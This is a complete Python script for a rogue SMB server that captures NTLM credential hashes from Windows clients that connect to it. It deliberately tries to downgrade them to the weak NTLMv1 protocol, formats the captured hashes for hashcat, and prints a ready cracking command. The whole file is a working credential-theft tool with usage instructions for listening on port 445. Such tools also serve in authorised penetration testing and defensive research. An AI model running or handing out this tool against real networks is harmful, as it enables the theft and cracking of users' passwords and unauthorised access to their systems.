#!/usr/bin/env python3
"""Minimal SMB server that captures NTLMv1 or NTLMv2 hashes.

Handles Windows SMB1->SMB2 protocol upgrade and SPNEGO/GSS-API wrapping.
Attempts NTLMv1 downgrade by omitting Extended Session Security from the
challenge flags. If the client's LmCompatibilityLevel allows it, we get
NTLMv1 (hashcat 5500, trivially crackable). Otherwise NTLMv2 (hashcat 5600).

Pure stdlib — no impacket, no pip dependencies.

Usage:
    sudo python3 smb_capture.py                    # listen 0.0.0.0:445
    sudo python3 smb_capture.py --port 445 --out hash.txt
    sudo python3 smb_capture.py --no-downgrade     # don't attempt NTLMv1
"""

import argparse
import os
import socket
import struct
import sys
import time


# --- Constants ---

SMB1_MAGIC = b"\xffSMB"
SMB2_MAGIC = b"\xfeSMB"

SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001

STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING = 0xC0000016

NTLMSSP_SIGNATURE = b"NTLMSSP\x00"
NTLMSSP_NEGOTIATE_MSG = 1
NTLMSSP_CHALLENGE_MSG = 2
NTLMSSP_AUTH_MSG = 3

# NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
NTLMSSP_OID = b"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"

# --- NTLMSSP Negotiate Flags (MS-NLMP 2.2.2.5) ---
NTLMSSP_NEGOTIATE_UNICODE          = 0x00000001  # bit 0
NTLMSSP_REQUEST_TARGET             = 0x00000004  # bit 2
NTLMSSP_NEGOTIATE_NTLM             = 0x00000200  # bit 9
NTLMSSP_NEGOTIATE_ALWAYS_SIGN      = 0x00008000  # bit 15
NTLMSSP_TARGET_TYPE_DOMAIN         = 0x00010000  # bit 16
NTLMSSP_NEGOTIATE_EXTENDED_SESS    = 0x00080000  # bit 19
NTLMSSP_NEGOTIATE_TARGET_INFO      = 0x00800000  # bit 23
NTLMSSP_NEGOTIATE_VERSION          = 0x02000000  # bit 25
NTLMSSP_NEGOTIATE_128              = 0x20000000  # bit 29
NTLMSSP_NEGOTIATE_KEY_EXCH         = 0x40000000  # bit 30
NTLMSSP_NEGOTIATE_56               = 0x80000000  # bit 31

# Challenge flags WITH Extended Session Security (forces NTLMv2)
NTLM_FLAGS_V2 = (
    NTLMSSP_NEGOTIATE_UNICODE
    | NTLMSSP_REQUEST_TARGET
    | NTLMSSP_NEGOTIATE_NTLM
    | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    | NTLMSSP_TARGET_TYPE_DOMAIN
    | NTLMSSP_NEGOTIATE_EXTENDED_SESS
    | NTLMSSP_NEGOTIATE_TARGET_INFO
    | NTLMSSP_NEGOTIATE_VERSION
    | NTLMSSP_NEGOTIATE_128
    | NTLMSSP_NEGOTIATE_KEY_EXCH
    | NTLMSSP_NEGOTIATE_56
)

# Challenge flags WITHOUT Extended Session Security (NTLMv1 downgrade)
NTLM_FLAGS_V1 = (
    NTLMSSP_NEGOTIATE_UNICODE
    | NTLMSSP_REQUEST_TARGET
    | NTLMSSP_NEGOTIATE_NTLM
    | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    | NTLMSSP_TARGET_TYPE_DOMAIN
    | NTLMSSP_NEGOTIATE_TARGET_INFO
    | NTLMSSP_NEGOTIATE_VERSION
    | NTLMSSP_NEGOTIATE_128
    | NTLMSSP_NEGOTIATE_KEY_EXCH
    | NTLMSSP_NEGOTIATE_56
)


def windows_filetime():
    epoch_diff = 116444736000000000
    return int(time.time() * 10000000) + epoch_diff


# --- DER/ASN.1 helpers for SPNEGO ---

def der_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])


def der_tlv(tag, value):
    return bytes([tag]) + der_length(len(value)) + value


def build_spnego_neg_token_resp(ntlmssp_blob):
    neg_result = der_tlv(0xa0, der_tlv(0x0a, b"\x01"))
    supported_mech = der_tlv(0xa1, NTLMSSP_OID)
    response_token = der_tlv(0xa2, der_tlv(0x04, ntlmssp_blob))
    inner = neg_result + supported_mech + response_token
    return der_tlv(0xa1, der_tlv(0x30, inner))


def build_spnego_neg_token_init():
    mech_list = der_tlv(0xa0, der_tlv(0x30, NTLMSSP_OID))
    neg_init = der_tlv(0xa0, der_tlv(0x30, mech_list))
    spnego_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02"
    return der_tlv(0x60, spnego_oid + neg_init)


# --- Network helpers ---

def netbios_wrap(data):
    return b"\x00" + struct.pack(">I", len(data))[1:] + data


def recv_message(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", b"\x00" + hdr[1:4])[0]
    if length == 0:
        return b""
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def is_smb1(data):
    return len(data) >= 4 and data[0:4] == SMB1_MAGIC


# --- SMB2 builders ---

def build_smb2_header(command, status, message_id, session_id=0, credits=1):
    header = bytearray(64)
    header[0:4] = SMB2_MAGIC
    struct.pack_into("<H", header, 4, 64)
    struct.pack_into("<H", header, 6, 0)
    struct.pack_into("<I", header, 8, status)
    struct.pack_into("<H", header, 12, command)
    struct.pack_into("<H", header, 14, credits)
    struct.pack_into("<I", header, 16, 0x00000001)  # Flags: Response
    struct.pack_into("<Q", header, 24, message_id)
    struct.pack_into("<Q", header, 40, session_id)
    return bytes(header)


SERVER_GUID = os.urandom(16)


def build_negotiate_response(message_id, dialect=0x0202):
    spnego_hint = build_spnego_neg_token_init()

    body = bytearray(64)
    struct.pack_into("<H", body, 0, 65)        # StructureSize
    struct.pack_into("<H", body, 2, 0x0001)    # SecurityMode: signing enabled
    struct.pack_into("<H", body, 4, dialect)    # DialectRevision
    body[8:24] = SERVER_GUID                   # ServerGuid (stable across negotiates)
    struct.pack_into("<I", body, 24, 0)        # Capabilities
    struct.pack_into("<I", body, 28, 0x100000) # MaxTransactSize
    struct.pack_into("<I", body, 32, 0x100000) # MaxReadSize
    struct.pack_into("<I", body, 36, 0x100000) # MaxWriteSize
    struct.pack_into("<Q", body, 40, windows_filetime())  # SystemTime
    sec_offset = 64 + 64
    struct.pack_into("<H", body, 56, sec_offset)
    struct.pack_into("<H", body, 58, len(spnego_hint))
    body += spnego_hint

    header = build_smb2_header(SMB2_NEGOTIATE, STATUS_SUCCESS, message_id)
    return netbios_wrap(header + bytes(body))


def build_target_info():
    pairs = bytearray()

    def add_pair(av_id, data):
        pairs.extend(struct.pack("<HH", av_id, len(data)))
        pairs.extend(data)

    add_pair(2, "ELEVENPP".encode("utf-16-le"))           # MsvAvNbDomainName
    add_pair(1, "SERVER".encode("utf-16-le"))              # MsvAvNbComputerName
    add_pair(4, "elevenpp.local".encode("utf-16-le"))      # MsvAvDnsDomainName
    add_pair(3, "server.elevenpp.local".encode("utf-16-le"))  # MsvAvDnsComputerName
    add_pair(7, struct.pack("<Q", windows_filetime()))     # MsvAvTimestamp
    add_pair(0, b"")                                       # MsvAvEOL

    return bytes(pairs)


def build_ntlmssp_version():
    ver = bytearray(8)
    ver[0] = 10
    ver[1] = 0
    struct.pack_into("<H", ver, 2, 17763)
    ver[7] = 0x0F
    return bytes(ver)


def build_ntlmssp_challenge(server_challenge, ntlm_flags):
    target_name = "ELEVENPP".encode("utf-16-le")
    target_info = build_target_info()
    version = build_ntlmssp_version()

    # Fixed: Sig(8)+Type(4)+TargetNameFields(8)+Flags(4)+Challenge(8)+Reserved(8)+TargetInfoFields(8)+Version(8) = 56
    fixed_len = 56

    msg = bytearray()
    msg += NTLMSSP_SIGNATURE
    msg += struct.pack("<I", NTLMSSP_CHALLENGE_MSG)

    tn_offset = fixed_len
    msg += struct.pack("<HHI", len(target_name), len(target_name), tn_offset)

    msg += struct.pack("<I", ntlm_flags)
    msg += server_challenge
    msg += b"\x00" * 8

    ti_offset = tn_offset + len(target_name)
    msg += struct.pack("<HHI", len(target_info), len(target_info), ti_offset)

    msg += version

    msg += target_name
    msg += target_info

    return bytes(msg)


def build_session_setup_response(message_id, session_id, security_blob, status):
    sec_offset = 64 + 8
    body = bytearray(8)
    struct.pack_into("<H", body, 0, 9)
    struct.pack_into("<H", body, 2, 0)
    struct.pack_into("<H", body, 4, sec_offset)
    struct.pack_into("<H", body, 6, len(security_blob))
    body += security_blob
    header = build_smb2_header(SMB2_SESSION_SETUP, status, message_id,
                               session_id=session_id)
    return netbios_wrap(header + bytes(body))


# --- Parsing ---

def parse_smb2_header(data):
    if len(data) < 64 or data[0:4] != SMB2_MAGIC:
        return None
    return {
        "command": struct.unpack_from("<H", data, 12)[0],
        "message_id": struct.unpack_from("<Q", data, 24)[0],
        "session_id": struct.unpack_from("<Q", data, 40)[0],
    }


def extract_ntlmssp(data):
    idx = data.find(NTLMSSP_SIGNATURE)
    if idx < 0:
        return None
    return data[idx:]


def parse_ntlmssp_auth(blob):
    if len(blob) < 44 or blob[8:12] != struct.pack("<I", NTLMSSP_AUTH_MSG):
        return None

    def _field(offset):
        length = struct.unpack_from("<H", blob, offset)[0]
        buf_offset = struct.unpack_from("<I", blob, offset + 4)[0]
        if buf_offset + length > len(blob):
            return b""
        return blob[buf_offset:buf_offset + length]

    return {
        "domain": _field(28).decode("utf-16-le", errors="replace"),
        "username": _field(36).decode("utf-16-le", errors="replace"),
        "lm_response": _field(12),
        "nt_response": _field(20),
    }


def classify_and_format(auth, server_challenge):
    username = auth["username"]
    domain = auth["domain"]
    lm_resp = auth["lm_response"]
    nt_resp = auth["nt_response"]

    if len(nt_resp) > 24:
        version = "NTLMv2"
        hashcat_mode = 5600
        nt_proof_str = nt_resp[:16]
        client_blob = nt_resp[16:]
        hash_line = (
            f"{username}::{domain}:"
            f"{server_challenge.hex()}:"
            f"{nt_proof_str.hex()}:"
            f"{client_blob.hex()}"
        )
    else:
        version = "NTLMv1"
        hashcat_mode = 5500
        hash_line = (
            f"{username}::{domain}:"
            f"{lm_resp.hex()}:"
            f"{nt_resp.hex()}:"
            f"{server_challenge.hex()}"
        )

    return version, hashcat_mode, hash_line


# --- Main handler ---

def handle_client(conn, addr, server_challenge, ntlm_flags):
    print(f"[*] Connection from {addr[0]}:{addr[1]}", flush=True)
    session_id = 0x0000100000000049

    downgrade = not (ntlm_flags & NTLMSSP_NEGOTIATE_EXTENDED_SESS)
    if downgrade:
        print("[*] NTLMv1 downgrade attempt enabled (no ESS flag)", flush=True)

    print(f"[*] Challenge flags: 0x{ntlm_flags:08x}", flush=True)

    while True:
        data = recv_message(conn)
        if data is None:
            print("[-] Client disconnected", flush=True)
            return None

        if len(data) == 0:
            continue

        if is_smb1(data):
            print("[*] <- SMB1 NEGOTIATE (upgrading to SMB2)", flush=True)
            resp = build_negotiate_response(0, dialect=0x02FF)
            conn.sendall(resp)
            print(f"[*] -> SMB2 NEGOTIATE response (dialect 0x02FF, "
                  f"{len(resp)} bytes)", flush=True)
            continue

        hdr = parse_smb2_header(data)
        if hdr is None:
            print(f"[-] Unknown data (first 8: {data[:8].hex()})", flush=True)
            continue

        if hdr["command"] == SMB2_NEGOTIATE:
            print("[*] <- SMB2 NEGOTIATE", flush=True)
            resp = build_negotiate_response(hdr["message_id"], dialect=0x0202)
            conn.sendall(resp)
            print(f"[*] -> NEGOTIATE response (dialect 0x0202, "
                  f"{len(resp)} bytes)", flush=True)

        elif hdr["command"] == SMB2_SESSION_SETUP:
            ntlmssp = extract_ntlmssp(data)
            if ntlmssp is None:
                print("[-] No NTLMSSP in SESSION_SETUP", flush=True)
                continue

            msg_type = struct.unpack_from("<I", ntlmssp, 8)[0]

            if msg_type == NTLMSSP_NEGOTIATE_MSG:
                print(f"[*] <- SESSION_SETUP / NTLMSSP_NEGOTIATE "
                      f"({len(data)} bytes)", flush=True)
                raw_challenge = build_ntlmssp_challenge(server_challenge, ntlm_flags)
                spnego_resp = build_spnego_neg_token_resp(raw_challenge)
                resp = build_session_setup_response(
                    hdr["message_id"], session_id, spnego_resp,
                    STATUS_MORE_PROCESSING)
                conn.sendall(resp)
                mode_str = "NTLMv1 attempt" if downgrade else "NTLMv2"
                print(f"[*] -> SESSION_SETUP / NTLMSSP_CHALLENGE ({mode_str}, "
                      f"challenge: {server_challenge.hex()}, "
                      f"{len(resp)} bytes)", flush=True)

            elif msg_type == NTLMSSP_AUTH_MSG:
                print(f"[*] <- SESSION_SETUP / NTLMSSP_AUTH "
                      f"({len(data)} bytes)", flush=True)
                auth = parse_ntlmssp_auth(ntlmssp)
                if auth is None:
                    print("[-] Failed to parse AUTH message", flush=True)
                    return None

                version, mode, hash_line = classify_and_format(auth, server_challenge)
                print(f"[+] User: {auth['domain']}\\{auth['username']}", flush=True)
                print(f"[+] Type: {version} (hashcat -m {mode})", flush=True)
                print(f"[+] LM resp: {len(auth['lm_response'])} bytes, "
                      f"NT resp: {len(auth['nt_response'])} bytes", flush=True)
                print(f"[+] Hash:\n{hash_line}", flush=True)

                resp = build_session_setup_response(
                    hdr["message_id"], session_id, b"", STATUS_SUCCESS)
                conn.sendall(resp)
                return version, mode, hash_line
        else:
            print(f"[*] <- SMB2 cmd 0x{hdr['command']:04x} (ignored)", flush=True)


def main():
    p = argparse.ArgumentParser(description="SMB NTLMv1/v2 hash capture server")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=445)
    p.add_argument("--out", default=None, help="Write hash to file")
    p.add_argument("--no-downgrade", action="store_true",
                   help="Don't attempt NTLMv1 downgrade")
    args = p.parse_args()

    ntlm_flags = NTLM_FLAGS_V2 if args.no_downgrade else NTLM_FLAGS_V1
    server_challenge = os.urandom(8)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((args.host, args.port))
    except PermissionError:
        sys.exit(f"[-] Cannot bind to port {args.port} — run as root (sudo)")
    except OSError as e:
        sys.exit(f"[-] Bind failed: {e}")

    srv.listen(5)
    mode_str = "NTLMv2 only" if args.no_downgrade else "NTLMv1 downgrade attempt"
    print(f"[*] Listening on {args.host}:{args.port} ({mode_str})", flush=True)
    print(f"[*] Server challenge: {server_challenge.hex()}", flush=True)
    print(f"[*] Negotiate flags: 0x{ntlm_flags:08x}", flush=True)
    print("[*] Waiting for SMB connection...", flush=True)

    try:
        while True:
            conn, addr = srv.accept()
            try:
                result = handle_client(conn, addr, server_challenge, ntlm_flags)
            except ConnectionResetError:
                print(f"[-] Connection reset by {addr[0]}:{addr[1]}", flush=True)
                result = None
            finally:
                conn.close()

            if result:
                version, mode, hash_line = result
                print(f"\n[+] Captured {version} hash!", flush=True)
                print(f"[+] Crack: hashcat -m {mode} hash.txt wordlist.txt",
                      flush=True)
                if args.out:
                    with open(args.out, "a") as f:
                        f.write(hash_line + "\n")
                    print(f"[+] Appended to {args.out}", flush=True)
                break
    except KeyboardInterrupt:
        print("\n[*] Interrupted", flush=True)

    srv.close()


if __name__ == "__main__":
    main()
